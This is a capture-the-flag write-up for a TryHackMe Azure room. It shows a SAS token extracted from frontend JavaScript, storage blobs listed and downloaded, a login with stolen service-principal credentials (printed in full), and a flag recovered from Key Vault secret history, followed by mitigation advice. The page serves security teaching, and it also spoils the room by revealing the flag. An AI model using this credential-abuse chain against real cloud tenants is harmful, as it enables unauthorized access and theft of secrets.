---
layout: default
title: Day 9 - CryptoCabana
---

- [./ctf-writeups](../../../../) / [TryHackMe](../../../) / [Events](../../) / [Byte Lotus Hotel](../) / [Day 8 - Towel On The Sunbed](../8_Towel_On_The_Sunbed)

# Day 9 - CryptoCabana

[**Try it yourself**](https://tryhackme.com/room/hh-cryptocabana-f81cac95) 
**Difficulty:** Medium  
**Category:** Cloud security / Azure exploitation

**Summary:** This room focuses on the dangers of hardcoded cloud credentials in public-facing applications. By inspecting the frontend JavaScript of an Azure-hosted web app, we extract a highly privileged Shared Access Signature (SAS) token. We use this token with the Azure CLI to download sensitive files from a storage container, revealing Service Principal credentials. Finally, we log into the Azure environment and extract a fragmented flag from a Key Vault, utilizing secret version history to recover a rotated password.

## 1. Reconnaissance and frontend enumeration

Our starting point is a web application hosted on an Azure Storage Account: `https://cryptocabanaf5scjagc.z13.web.core.windows.net/`

Since this is a client-side web application, our first step was to inspect the source code delivered to our browser using the Developer Tools. Inside a JavaScript file named `app.js`, we discovered hardcoded Azure Storage configurations:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";
```

The `BACKUP_SAS` is a Shared Access Signature token. In Azure, a SAS token is a URI that grants restricted access rights to Azure Storage resources. If a developer sets the expiration date too far in the future (in this case, the year 2099) and gives it too many permissions, it becomes a severe security risk.

## 2. Exploitation (Azure Storage and SAS abuse)

With the leaked SAS token, we can interact directly with the Azure Storage account using the Azure Command Line Interface (`az`).

First, we listed all the containers within the storage account:

```bash
az storage container list --account-name cryptocabanaf5scjagc --sas-token "?sv=2022-11-02..." -o table
```

This revealed three containers: `$web`, `backups`, and `vault`. The `vault` container sounded the most interesting, so we listed its contents:

```bash
az storage blob list --account-name cryptocabanaf5scjagc --sas-token "?sv=2022-11-02..." --container-name vault -o table
```

We found two sensitive files: `seed_phrase.txt` and `backup-service-account.json`. We downloaded both using the `az storage blob download` command.

Inspecting the `backup-service-account.json` file revealed the credentials for an Azure Service Principal (which acts as a service account for applications), including a `client_id`, `client_secret`, and `tenant_id`, along with the name of an Azure Key Vault: `ccabana-kv-f5scjagc`.

## 3. Privilege escalation (Azure Key Vault and secret history)

We used the stolen Service Principal credentials to authenticate our local Azure CLI session into the target's Azure environment:

```bash
az login --service-principal -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 -p UBX8Q~xM6vawWZ5u2C-VhLlsB2Cx2dAuxcrAlbRg --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

Now authenticated, we targeted the Key Vault mentioned in the JSON file to list its stored secrets:

```bash
az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table
```

We discovered four secrets: `key-shard-1`, `key-shard-2`, `key-shard-3`, and `master-key`. We read the values of the key shards one by one:
* `key-shard-1`: `"THM{n0t_ur"`
* `key-shard-3`: `"ur_c01ns!}"`

However, reading `key-shard-2` returned a message instead of a flag fragment: 
*"Rotated this after IT flagged it -- old value should still be recoverable if you know where to look."*

Azure Key Vault keeps a history of all secret modifications. To find the old value, we queried the version history for `key-shard-2`:

```bash
az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2
```

This gave us the unique ID of the older version of the secret. We then requested the value of that specific ID:

```bash
az keyvault secret show --id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" --query value
```

This successfully revealed the missing fragment: `"_k3ys_n0t_"`. By combining the three fragments, we assembled the final flag.

**Flag:**
<span class="spoiler" role="button" tabindex="0" aria-label="Hidden flag">THM{n0t_ur_k3ys_n0t_ur_c01ns!}</span>

## 4. Mitigation (how to fix it)

To prevent this entire attack chain, cloud administrators and developers must enforce the following security practices:

+ **Never hardcode secrets in frontend code:** Public-facing applications (like JavaScript loaded in the browser) should never contain SAS tokens, API keys, or credentials.
+ **Restrict SAS token scope:** If a SAS token must be used, it should have the shortest possible expiration time (valid for 15 minutes, not 75 years) and strictly limited permissions (read-only access to a single specific file, not the entire storage account).
+ **Enforce the principle of least privilege:** The Service Principal stored in the vault had permission to read secret values. Service accounts should only have access to the specific resources they actively need to function.
+ **Secure credential storage:** Avoid storing sensitive Service Principal JSON files in standard Azure Storage blobs. Instead, rely entirely on managed identities or secure backend key vaults.

<br>
- [Day 10 - The Hollow Shell](../10_The_Hollow_Shell)